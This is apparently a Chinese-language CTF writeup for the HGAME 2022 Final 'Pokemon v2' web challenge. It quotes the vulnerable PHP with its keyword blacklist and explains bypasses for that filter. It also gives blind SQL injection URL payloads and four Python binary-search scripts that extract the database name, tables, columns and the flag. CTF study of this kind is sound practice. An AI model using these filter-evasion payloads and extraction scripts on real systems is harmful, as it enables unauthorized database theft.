---
title: HGAME 2022 Final Pokemon v2 writeup
date: 2022-03-16 15:58:00
tags: [ctf,security]
cover: https://w.wallhaven.cc/full/0q/wallhaven-0q2jwr.jpg
top_img: false
---

# Hgame final Pokemon v2 writeup
 
## 题目概述

一道sql盲注的题目，无直接回显并且waf比较多，final的时候没做出来现在来补一补题

>参考:
>
>http://dhycnhdu.com/index.php/archives/5/
>
>https://blog.51cto.com/u_15400016/4287240

## 如何绕过滤

题目是给出了源码，根据源码的waf我们先来说说如何绕过waf

```php
<?php

$server = $_ENV['MYSQL_ADDR'];
$username = $_ENV['MYSQL_USER'];
$password = $_ENV['MYSQL_PASSWORD'];
$database = $_ENV['DATABASE'];

$db = new mysqli($server, $username, $password, $database);
if ($db->connect_error) {
    die('鏁版嵁搴撻摼鎺ュけ璐ワ紒');
}

function waf($code) {
    $blacklist = ['substr', 'mid', '=', 'like', '#', '\'', '"', '!','extract', 'update', '\^', '\$','union', '\bor\b', 'and', ' ', '\+', '-'];
    foreach($blacklist as $b) {
        if (preg_match('/'.$b.'/i', $code)) {
            return true;
        }
    }
    return false;
}

function getStatusMessage($code) {
    global $db;

    if (waf($code)) {
        return -1;
    }
    $sql = 'SELECT code,msg FROM errors WHERE code='.$code;
    return $db->query($sql);
}
```



sql语句中直接将code变量拼接进sql语句，导致sql注入的发生。

union的过滤导致不能使用联合查询，联合查询就是直接可以把查询结果带出来，这里只能用盲注，下面是对waf的过滤一些绕过的措施

substr -> right(left(xxx,1),1)

空格 -> /**/

= -> in() 或者 >

and -> %26%26

字符串过滤 -> 16进制编码

子查询需要外层加个括号

## 注入点的判断

首先是注入点，在这个error界面的code变量存在sql注入

![image-20220315212706758](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220315212706758.png)

## 字段数

使用order by对返回字段数量进行判断

`/error.php?code=404/**/order/**/by/**/3`

回显failed to query database

`/error.php?code=404/**/order/**/by/**/2`

回显pokemon not found 

说明字段数为2

## 数据库长度

`/error.php?code=404/**/%26%26/**/if(length(database())>7,sleep(1),1)`

回显pokemon not found 

`/error.php?code=404/**/%26%26/**/if(length(database())>6,sleep(1),1)`

回显为空

说明数据库长度为7

## 数据库名

原payload:`/error.php?code=404 and ascii(substr(database(),1,1)>112`

绕waf后如下

`/error.php?code=404/**/%26%26/**/ascii(right(left(database(),1),1))>112`

回显为空

`/error.php?code=404/**/%26%26/**/ascii(right(left(database(),1),1))>111`

回显pokemon not found

说明数据库字段第一个字符为p

然后我们需要写个python脚本，手动注入不是个事，写个python脚本用二分法注入比较快

```python
# -*- coding: utf-8 -*-
import requests
import re

findlink = re.compile(r'(.*) Pokemon (.*?) .*')
baseurl = "http://146.56.223.34:65432/error.php?code="
dbs = ""
for i in range(1, 8):
    print('----------------------------------------------------')
    min_value = 33
    max_value = 130
    mid = (min_value + max_value) // 2  # 中值
    while (min_value < max_value):
        code = f"404/**/%26%26/**/ascii(right(left(database(),{i}),1))>{mid}"
        payload = baseurl + code
        r = requests.get(payload)
        # 回显404说明表达式成立，mid太小
        if (len(re.findall(findlink, r.text)) != 0):
            min_value = mid + 1
        # 无回显说明表达式不成立，mid太大
        else:
            max_value = mid
        mid = (min_value + max_value) // 2
    dbs += chr(mid)
    print(dbs)
```

得到数据库名称pokemon

## 表名

原payload:`?code=404 and (ascii(substr((select table_name from information_schema.tables where table_schema='pokemon' limit 0,1),1,1)))>? `

```python
# -*- coding: utf-8 -*-
import requests
import re

findlink = re.compile(r'(.*) Pokemon (.*?) .*')
baseurl = "http://146.56.223.34:65432/error.php?code="
dbs = ""
for i in range(1, 100):
    print('----------------------------------------------------')
    min_value = 33
    max_value = 130
    mid = (min_value + max_value) // 2  # 中值
    while (min_value < max_value):
        code = f"404/**/%26%26/**/ascii(right(left((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/in/**/(0x706f6b656d6f6e)/**/limit/**/0,1),{i}),1))>{mid}"
        payload = baseurl + code
        r = requests.get(payload)
        # 回显404说明表达式成立，mid太小
        if (len(re.findall(findlink, r.text)) != 0):
            min_value = mid + 1
        # 无回显说明表达式不成立，mid太大
        else:
            max_value = mid
        mid = (min_value + max_value) // 2
    dbs += chr(mid)
    print(dbs)
```

![image-20220316154816406](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220316154816406.png)

得到表名errors,seeeeeeecret，不过爆数据列的时候我是用table_schema = 'pokemon'的所以说这个表名没有用上，另外这个脚本有些问题，因为我没判断长度，所以说爆出来的长度不太确定，但是通常不会在末尾有重复字符

## 列名

原payload:`?code=404 and (ascii(substr((select column_name from information_schema.columns where table_schema='pokemon' limit 0,1),1,1)))>? `

```python
# -*- coding: utf-8 -*-
import requests
import re

findlink = re.compile(r'(.*) Pokemon (.*?) .*')
baseurl = "http://146.56.223.34:65432/error.php?code="
dbs = ""
for i in range(1, 100):
    print('----------------------------------------------------')
    min_value = 33
    max_value = 130
    mid = (min_value + max_value) // 2  # 中值
    while (min_value < max_value):
        code = f"404/**/%26%26/**/ascii(right(left((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/in/**/(0x706f6b656d6f6e)/**/limit/**/0,1),{i}),1))>{mid}"
        payload = baseurl + code
        r = requests.get(payload)
        # 回显404说明表达式成立，mid太小
        if (len(re.findall(findlink, r.text)) != 0):
            min_value = mid + 1
        # 无回显说明表达式不成立，mid太大
        else:
            max_value = mid
        mid = (min_value + max_value) // 2
    dbs += chr(mid)
    print(dbs)
```

![image-20220316154513548](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220316154513548.png)

得到列名id,code,msg,flag

## 值

原payload:`?code=404 and (ascii(substr((select flag from seeeeeeecret limit 0,1),1,1)))>? `

```python
# -*- coding: utf-8 -*-
import requests
import re

findlink = re.compile(r'(.*) Pokemon (.*?) .*')
baseurl = "http://146.56.223.34:65432/error.php?code="
dbs = ""
for i in range(1, 100):
    print('----------------------------------------------------')
    min_value = 33
    max_value = 130
    mid = (min_value + max_value) // 2  # 中值
    while (min_value < max_value):
        code = f"404/**/%26%26/**/ascii(right(left((select/**/flag/**/from/**/seeeeeeecret/**/limit/**/0,1),{i}),1))>{mid}"
        payload = baseurl + code
        r = requests.get(payload)
        # 回显404说明表达式成立，mid太小
        if (len(re.findall(findlink, r.text)) != 0):
            min_value = mid + 1
        # 无回显说明表达式不成立，mid太大
        else:
            max_value = mid
        mid = (min_value + max_value) // 2
    dbs += chr(mid)
    print(dbs)

```



![image-20220316154044412](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220316154044412.png)

`hgame{96mz5v3c9hnj49t7xqj76et6xw4dpczy}`